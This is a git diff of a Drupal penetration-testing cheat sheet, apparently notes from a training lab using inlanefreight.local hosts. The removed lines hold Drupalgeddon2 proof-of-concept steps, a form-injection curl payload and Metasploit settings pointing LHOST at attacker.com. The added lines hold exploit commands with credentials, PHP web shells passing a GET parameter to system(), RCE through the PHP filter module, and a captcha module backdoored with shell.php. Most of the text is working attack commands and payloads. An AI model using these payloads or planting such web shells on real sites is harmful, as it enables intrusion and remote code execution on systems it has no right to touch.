@@ -93,25 +93,22 @@ run
 use exploit/unix/webapp/drupal_restws_unserialize
 set RHOSTS target.com
 run
+```
 
+# DrupalGeddon
+```powershell
+https://www.exploit-db.com/exploits/34992
 
-# PoC skript
-git clone https://github.com/dreadlocked/Drupalgeddon2
-cd Drupalgeddon2
-gem install highline
-ruby drupalgeddon2.rb https://target.com
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
 
-# Manuel yoxlama
-curl -s -X POST \
-  "https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
+# DrupalGeddon 2
+```powershell
+curl -s http://drupal-dev.inlanefreight.local/hello.txt
 
-# Metasploit
-use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS target.com
-set LHOST attacker.com
-set LPORT 4444
-run
+<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
+
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
 ```
 
 # Module Enumeration
@@ -152,6 +149,32 @@ curl -s https://target.com/jsonapi/node/page
 # REST session token
 curl -s https://target.com/rest/session/token
 ```
+---
+<img width="898" height="587" alt="image" src="https://github.com/user-attachments/assets/b31da2bd-9305-4489-985f-87e45de18906" />
 
-#
+
+# Remote Code Execution
+```powershell
+<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);?>
+
+curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+
+
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+Administration > Reports > Available updates
+```
+<img width="903" height="447" alt="image" src="https://github.com/user-attachments/assets/a6248930-3fea-49c0-9ae2-b154b615a4a1" />
+---
+
+# Uploading Backdoor Module
+```powershell
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+
+tar xvf captcha-8.x-1.2.tar.gz
+
+shell.php
+<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);?>
+
+curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
 
